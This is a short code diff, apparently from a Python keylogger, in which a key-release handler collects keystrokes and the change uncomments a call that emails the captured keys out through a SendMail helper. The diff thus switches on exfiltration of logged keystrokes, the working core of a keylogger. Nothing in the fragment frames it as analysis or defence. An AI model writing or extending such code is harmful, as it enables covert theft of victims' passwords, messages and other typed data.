@@ -65,7 +65,7 @@ def email(keys):
 
         message += k"""
     #print(str(keys))
-    #SendMail.sendEmail(str(keys))
+    SendMail.sendEmail(str(keys))
 
 def on_release(key):
     global globalX
